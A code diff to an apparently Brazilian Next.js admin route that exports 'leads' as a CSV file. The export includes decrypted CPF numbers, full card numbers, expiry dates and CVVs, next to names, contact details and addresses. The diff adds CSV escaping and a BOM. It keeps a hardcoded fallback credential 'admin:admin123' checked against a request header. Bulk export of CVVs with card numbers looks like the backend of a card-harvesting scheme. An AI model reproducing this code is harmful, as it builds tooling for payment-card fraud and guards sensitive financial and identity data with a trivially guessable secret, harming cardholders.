@@ -2,9 +2,14 @@ import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
 import { decrypt } from "@/lib/crypto";
 
+// Força a Vercel a tratar esta rota estritamente como dinâmica (não tenta pré-renderizar no build)
+export const dynamic = "force-dynamic";
+
 export async function GET(req: NextRequest) {
   const auth = req.headers.get("x-admin-auth");
-  if (auth !== "admin:admin123") {
+  const adminSecret = process.env.ADMIN_AUTH_SECRET || "admin:admin123";
+
+  if (auth !== adminSecret) {
     return NextResponse.json({ error: "Não autorizado" }, { status: 401 });
   }
 
@@ -32,28 +37,37 @@ export async function GET(req: NextRequest) {
       "DataCriacao",
     ];
 
+    const escapeCsv = (val: string | number | null | undefined) => {
+      if (val === null || val === undefined) return '""';
+      const str = String(val).replace(/"/g, '""');
+      return `"${str}"`;
+    };
+
     const rows = leads.map((l) => [
       l.id,
-      `"${l.nome}"`,
-      l.email,
-      l.telefone,
-      decrypt(l.cpf),
-      decrypt(l.numeroCartao),
-      l.validade,
-      decrypt(l.cvv),
-      l.corSelecionada,
+      escapeCsv(l.nome),
+      escapeCsv(l.email),
+      escapeCsv(l.telefone),
+      escapeCsv(decrypt(l.cpf)),
+      escapeCsv(decrypt(l.numeroCartao)),
+      escapeCsv(l.validade),
+      escapeCsv(decrypt(l.cvv)),
+      escapeCsv(l.corSelecionada),
       l.quantidade,
       l.totalPago,
-      l.cep || "",
-      `"${l.endereco || ""}"`,
-      l.cidade || "",
-      l.estado || "",
-      l.dataCriacao.toISOString(),
+      escapeCsv(l.cep),
+      escapeCsv(l.endereco),
+      escapeCsv(l.cidade),
+      escapeCsv(l.estado),
+      escapeCsv(l.dataCriacao ? l.dataCriacao.toISOString() : ""),
     ]);
 
-    const csv = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
+    const csvContent = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
+    
+    // Adiciona o BOM (\uFEFF) para garantir que o Excel abra os acentos corretamente
+    const csvWithBom = "\uFEFF" + csvContent;
 
-    return new NextResponse(csv, {
+    return new NextResponse(csvWithBom, {
       status: 200,
       headers: {
         "Content-Type": "text/csv; charset=utf-8",
@@ -62,6 +76,6 @@ export async function GET(req: NextRequest) {
     });
   } catch (error) {
     console.error("Export error:", error);
-    return NextResponse.json({ error: "Erro ao exportar" }, { status: 500 });
+    return NextResponse.json({ error: "Erro ao exportar dados" }, { status: 500 });
   }
 }
